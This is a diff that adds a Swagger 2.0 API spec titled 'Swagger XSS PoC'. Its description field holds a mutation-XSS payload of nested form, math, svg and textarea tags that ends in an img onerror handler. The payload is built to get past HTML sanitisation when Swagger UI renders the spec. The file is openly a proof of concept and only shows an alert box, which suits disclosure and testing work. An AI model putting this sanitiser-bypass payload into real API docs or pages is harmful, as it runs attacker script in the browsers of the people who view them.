@@ -1,0 +1,14 @@
+
+swagger: "2.0"
+info:
+  title: "Swagger XSS PoC"
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea>
+    <path id="</textarea><img src=x onerror=alert('XSS-by-PTC')>>
+    </form>
+  version: "production"
+basePath: /api/
+produces:
+  - application/xml
+  - application/json
+paths: {}
